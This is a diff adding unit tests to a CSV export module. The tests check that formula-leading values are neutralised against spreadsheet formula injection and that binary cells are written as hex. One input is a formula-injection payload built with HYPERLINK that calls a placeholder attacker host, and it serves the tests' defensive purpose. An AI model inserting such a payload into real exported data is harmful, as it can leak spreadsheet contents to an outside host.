@@ -35,6 +35,33 @@ describe("csvRow", () => {
   test("writes a boolean and a bigint as themselves", () => {
     expect(csvRow([true, false, BigInt(10)])).toBe("true,false,10");
   });
+
+  test("neutralises every leading character a spreadsheet reads as the start of a formula", () => {
+    expect(csvRow(['=HYPERLINK("http://attacker/"&A1)'])).toBe(`"'=HYPERLINK(""http://attacker/""&A1)"`);
+    expect(csvRow(["+1+1"])).toBe(`"'+1+1"`);
+    expect(csvRow(["-1+1"])).toBe(`"'-1+1"`);
+    expect(csvRow(["@SUM(A1)"])).toBe(`"'@SUM(A1)"`);
+    expect(csvRow(["\t=1+1"])).toBe(`"'\t=1+1"`);
+    expect(csvRow(["\r=1+1"])).toBe(`"'\r=1+1"`);
+  });
+
+  test("leaves a number alone, however it arrives, because a bare decimal cannot be a formula", () => {
+    expect(csvRow([-12.5, 12.5, BigInt(-10)])).toBe("-12.5,12.5,-10");
+    // A Postgres `numeric` reaches the export as a string, so the exemption is on the
+    // TEXT and not on the JavaScript type.
+    expect(csvRow(["-12.5", "-1e3", "+7", "-.5", "-1E+03"])).toBe("-12.5,-1e3,+7,-.5,-1E+03");
+  });
+
+  test("neutralises a value that only starts out numeric", () => {
+    expect(csvRow(["-1-2-3"])).toBe(`"'-1-2-3"`);
+    expect(csvRow(["-12.5.6"])).toBe(`"'-12.5.6"`);
+    expect(csvRow(["-"])).toBe(`"'-"`);
+  });
+
+  test("writes an ordinary value byte-identically, prefix and quotes included", () => {
+    expect(csvRow(["plain", "a=b", "3-4", "user@example.com", "", null])).toBe("plain,a=b,3-4,user@example.com,,");
+    expect(csvRow(["Acme, Inc."])).toBe('"Acme, Inc."');
+  });
 });
 
 describe("toCsv", () => {
@@ -62,6 +89,10 @@ describe("toCsv", () => {
   test("leaves a column a row does not carry empty rather than shifting the ones after it", () => {
     const csv = toCsv([{ a: 1, c: 3 }], ["a", "b", "c"]);
     expect(csv).toBe("a,b,c\n1,,3");
+  });
+
+  test("neutralises a column name a spreadsheet would evaluate, not only a cell", () => {
+    expect(toCsv([{ "=1+1": "plain" }])).toBe(`"'=1+1"\nplain`);
   });
 
   test("quotes a column name that needs it", () => {
@@ -122,5 +153,29 @@ describe("toCsv — a value JSON cannot serialize", () => {
     const csv = toCsv([{ doc: cyclic }], ["doc"]);
     expect(csv.startsWith("doc\n")).toBe(true);
     expect(csv).toContain("root");
+  });
+});
+
+describe("toCsv — a binary value", () => {
+  // A `bytea`/`BLOB` cell used to be written as the JSON shape a Node Buffer
+  // stringifies to — about four bytes of digits per byte of data, and nothing a
+  // reader can turn back. The file has to say what the grid says, so both go
+  // through `asBytes`/`binaryText`.
+  test("writes the same hex the grid shows, not the serialized Buffer", () => {
+    expect(csvRow([{ type: "Buffer", data: [1, 2, 171, 255] }])).toBe("\\x0102abff");
+    expect(csvRow([new Uint8Array([1, 2, 171, 255])])).toBe("\\x0102abff");
+  });
+
+  test("writes the whole value, never the cell's truncated preview", () => {
+    const long = new Uint8Array(64).fill(0xab);
+    expect(csvRow([long])).toBe(`\\x${"ab".repeat(64)}`);
+  });
+
+  test("an empty byte array is the prefix alone, distinguishable from NULL", () => {
+    expect(csvRow([{ type: "Buffer", data: [] }, null])).toBe("\\x,");
+  });
+
+  test("a document that only looks like a serialized Buffer keeps its JSON form", () => {
+    expect(csvRow([{ type: "Buffer", data: [1, "two"] }])).toBe('"{""type"":""Buffer"",""data"":[1,""two""]}"');
   });
 });
